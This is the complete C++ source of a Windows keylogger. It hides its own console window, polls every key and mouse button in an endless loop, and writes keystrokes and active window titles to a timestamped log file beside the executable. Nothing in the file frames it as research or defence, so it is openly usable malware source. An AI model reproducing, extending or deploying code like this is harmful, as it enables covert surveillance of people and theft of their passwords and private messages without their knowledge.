#include "main.h"

using namespace std;

int WINAPI WinMain(
	_In_  HINSTANCE hInstance,
	_In_opt_  HINSTANCE hPrevInstance,
	_In_  LPSTR lpCmdLine,
	_In_  int nCmdShow
	)
{
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, 0);

	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME, PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH, __DATE__, __TIME__);
	puts(PROJECT_COPYRIGHT);
	puts("");

	string basepath = dirBasename(getSelfPath());

	time_t rawtime;
	struct tm* timeinfo = new tm();

	time(&rawtime);
	localtime_s(timeinfo, &rawtime);

	char filename[MAX_PATH];
	char filepath[MAX_PATH];

	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
	sprintf_s(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);

	delete timeinfo;

	string lastTitle = "";
	ofstream klogout(filepath);
	
	while(1) {
		Sleep(3);

		char title[1024];
		HWND hwndHandle = GetForegroundWindow();
		GetWindowText(hwndHandle, title, 1023);

		if(lastTitle != title) {
			klogout << endl << endl << "Window: ";
#ifdef DEBUG
			cout << endl << endl << "Window: ";
#endif

			if(strlen(title) == 0) {
				klogout << "NO ACTIVE WINDOW";
#ifdef DEBUG
				cout << "NO ACTIVE WINDOW";
#endif
			}
			else {
				klogout << "'" << title << "'";
#ifdef DEBUG
				cout << "'" << title << "'";
#endif
			}

			klogout << endl;
#ifdef DEBUG
			cout << endl;
#endif
			
			lastTitle = title;
		}
		
		for(unsigned char c = 1; c < 255; c++){
			SHORT rv = GetAsyncKeyState(c);

			if(rv & 1) {
				string out = "";

				if(c == 1)
					out = "[LMOUSE]";
				else if(c == 2)
					out = "[RMOUSE]";
				else if(c == 4)
					out = "[MMOUSE]";
				else if(c == 13)
					out = "[RETURN]";
				else if(c == 16 || c == 17 || c == 18)
					out = "";
				else if(c == 160 || c == 161)
					out = "[SHIFT]";
				else if(c == 162 || c == 163)
					out = "[STRG]";
				else if(c == 164)
					out = "[ALT]";
				else if(c == 165)
					out = "[ALT GR]";
				else if(c == 8)
					out = "[BACKSPACE]";
				else if(c == 9)
					out = "[TAB]";
				else if(c == 27)
					out = "[ESC]";
				else if(c == 33)
					out = "[PAGE UP]";
				else if(c == 34)
					out = "[PAGE DOWN]";
				else if(c == 35)
					out = "[HOME]";
				else if(c == 36)
					out = "[POS1]";
				else if(c == 37)
					out = "[ARROW LEFT]";
				else if(c == 38)
					out = "[ARROW UP]";
				else if(c == 39)
					out = "[ARROW RIGHT]";
				else if(c == 40)
					out = "[ARROW DOWN]";
				else if(c == 45)
					out = "[INS]";
				else if(c == 46)
					out = "[DEL]";
				else if((c >= 65 && c <= 90) || (c >= 48 && c <= 57) || c == 32)
					out = c;
				else if(c == 91 || c == 92)
					out = "[WIN]";
				else if(c >= 96 && c <= 105)
					out = "[NUM " + intToString(c - 96) + "]";
				else if(c == 106)
					out = "[NUM /]";
				else if(c == 107)
					out = "[NUM +]";
				else if(c == 109)
					out = "[NUM -]";
				else if(c == 109)
					out = "[NUM ,]";
				else if(c >= 112 && c <= 123)
					out = "[F" + intToString(c - 111) + "]";
				else if(c == 144)
					out = "[NUM]";
				else if(c == 192)
					out = "[OE]";
				else if(c == 222)
					out = "[AE]";
				else if(c == 186)
					out = "[UE]";
				else if(c == 186)
					out = "+";
				else if(c == 188)
					out = ",";
				else if(c == 189)
					out = "-";
				else if(c == 190)
					out = ".";
				else if(c == 191)
					out = "#";
				else if(c == 226)
					out = "<";
				else
					out = "[KEY \\" + intToString(c) + "]";
				
#ifdef DEBUG
				cout << ">" << out << "< (" << (unsigned)c << ")" << endl;
#endif

				klogout << out;
				klogout.flush();
			}
		}
	}
	
	klogout.close();
	
	return 0;
}